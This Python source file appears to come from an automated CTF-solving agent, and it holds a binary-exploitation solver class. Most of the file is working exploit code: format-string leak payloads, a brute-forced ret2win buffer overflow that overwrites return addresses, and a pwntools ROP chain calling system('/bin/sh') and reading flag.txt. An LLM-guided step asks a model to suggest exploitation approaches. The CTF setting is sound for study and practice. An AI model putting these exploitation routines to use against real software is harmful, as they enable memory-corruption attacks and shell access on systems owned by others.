"""
Pwn / Binary Exploitation Solver.

Strategies:
  1. checksec           — check binary protections
  2. format_string      — test for format string bugs
  3. bof_ret2win        — simple buffer overflow → ret2win
  4. bof_shellcode      — buffer overflow with shellcode
  5. rop_chain          — ROP chain via pwntools
  6. llm_pwn            — LLM-guided exploitation
"""

from __future__ import annotations

import re
import struct
from pathlib import Path
from typing import Optional, Callable

from agent.solvers.base import BaseSolver, SolveResult
from agent.analyzer import ChallengeInfo
from agent.reporter import SolveReport
from agent.validator import find_flags
from agent.config import WORK_DIR
from agent import tools
from agent import llm as llm_engine


class PwnSolver(BaseSolver):

    @property
    def strategies(self) -> list[tuple[str, Callable]]:
        return [
            ("checksec",        self._checksec),
            ("format_string",   self._format_string),
            ("bof_ret2win",     self._bof_ret2win),
            ("rop_basic",       self._rop_basic),
            ("llm_pwn",         self._llm_pwn),
        ]

    # ── Strategies ─────────────────────────────────────────────────────

    def _checksec(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        """Run checksec to identify binary protections."""
        if not info.is_file:
            return None

        try:
            from pwn import ELF
            elf = ELF(str(info.path), checksec=False)

            protections = {
                "RELRO": elf.relro if hasattr(elf, 'relro') else "unknown",
                "Stack Canary": elf.canary,
                "NX": elf.nx,
                "PIE": elf.pie,
            }

            report.log("solve",
                       f"Binary protections: {protections}")

            # Look for win/flag functions
            for name, func in elf.functions.items():
                if any(w in name.lower() for w in
                       ["win", "flag", "shell", "secret", "print_flag"]):
                    report.log("solve",
                               f"Found target function: {name} @ {hex(func.address)}")
                    return SolveResult(
                        artifacts={"win_func": f"{name}@{hex(func.address)}"}
                    )

        except ImportError:
            report.log("solve", "pwntools not installed", success=False)
        except Exception as exc:
            report.log("solve", f"checksec failed: {exc}", success=False)

        return None

    def _format_string(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        """Test for format string vulnerabilities."""
        if not info.is_file:
            return None

        # Send format string payloads
        payloads = [
            b"%x " * 20 + b"\n",
            b"%s\n",
            b"%p " * 20 + b"\n",
            b"AAAA" + b"%x." * 40 + b"\n",
        ]

        for payload in payloads:
            result = tools.run_raw(
                [str(info.path)],
                timeout=10,
                stdin_data=payload,
            )

            if result.success:
                flags = find_flags(result.output)
                if flags:
                    report.log("solve", "Flag via format string")
                    return SolveResult(flag=flags[0])

                # Check if we leaked memory (hex values)
                hex_pattern = r'[0-9a-f]{8,16}'
                leaks = re.findall(hex_pattern, result.stdout)
                if len(leaks) > 5:
                    report.log("solve",
                               f"Format string leak detected ({len(leaks)} values)")

        return None

    def _bof_ret2win(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        """Buffer overflow to overwrite return address with win function."""
        if not info.is_file:
            return None

        try:
            from pwn import ELF, process, cyclic, cyclic_find
        except ImportError:
            return None

        try:
            elf = ELF(str(info.path), checksec=False)

            # Find win function
            win_addr = None
            for name, func in elf.functions.items():
                if any(w in name.lower() for w in
                       ["win", "flag", "shell", "secret", "print_flag",
                        "give_flag", "get_flag"]):
                    win_addr = func.address
                    report.log("solve", f"Target: {name} @ {hex(win_addr)}")
                    break

            if win_addr is None:
                return None

            # Try different buffer sizes
            for buf_size in [20, 32, 40, 44, 48, 64, 72, 76, 80, 100, 128, 256]:
                payload = b"A" * buf_size
                if elf.bits == 64:
                    payload += struct.pack("<Q", win_addr)
                else:
                    payload += struct.pack("<I", win_addr)

                result = tools.run_raw(
                    [str(info.path)],
                    timeout=10,
                    stdin_data=payload + b"\n",
                )

                flags = find_flags(result.output)
                if flags:
                    report.log("solve",
                               f"BOF ret2win (offset={buf_size}) found flag!")
                    return SolveResult(flag=flags[0])

        except Exception as exc:
            report.log("solve", f"ret2win failed: {exc}", success=False)

        return None

    def _rop_basic(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        """Basic ROP chain building with pwntools."""
        if not info.is_file:
            return None

        try:
            from pwn import ELF, ROP
        except ImportError:
            return None

        try:
            elf = ELF(str(info.path), checksec=False)
            rop = ROP(elf)

            # Log available gadgets
            report.log("solve",
                       f"ROP gadgets found: {len(rop.gadgets)} gadgets")

            # Try simple ret2system if system and /bin/sh are available
            if elf.plt.get("system") and elf.search(b"/bin/sh"):
                sh_addr = next(elf.search(b"/bin/sh"))
                system_addr = elf.plt["system"]

                report.log("solve",
                           f"system@{hex(system_addr)}, "
                           f"/bin/sh@{hex(sh_addr)}")

                # Build ROP
                if elf.bits == 64:
                    # Need pop rdi gadget
                    try:
                        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
                        payload = b"A" * 72  # common offset
                        payload += struct.pack("<Q", pop_rdi)
                        payload += struct.pack("<Q", sh_addr)
                        payload += struct.pack("<Q", system_addr)

                        result = tools.run_raw(
                            [str(info.path)],
                            timeout=10,
                            stdin_data=payload + b"\ncat flag.txt\n",
                        )
                        flags = find_flags(result.output)
                        if flags:
                            report.log("solve", "ROP ret2system found flag!")
                            return SolveResult(flag=flags[0])
                    except Exception:
                        pass

        except Exception as exc:
            report.log("solve", f"ROP failed: {exc}", success=False)

        return None

    def _llm_pwn(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        context_parts = [
            f"Challenge: {info.name}",
            f"File type: {info.file_type}",
        ]
        if info.strings_sample:
            context_parts.append(f"Strings:\n{info.strings_sample[:2000]}")

        try:
            response = llm_engine.solve_puzzle(
                "This is a binary exploitation / pwn CTF challenge. "
                "Analyze and suggest the exploitation approach.",
                context="\n".join(context_parts),
            )
            flags = find_flags(response)
            if flags:
                report.log("solve", "LLM found the flag")
                return SolveResult(flag=flags[0])
            report.log("solve", "LLM pwn analysis",
                       detail=response[:500], success=False)
        except Exception as exc:
            report.log("solve", f"LLM failed: {exc}", success=False)

        return None
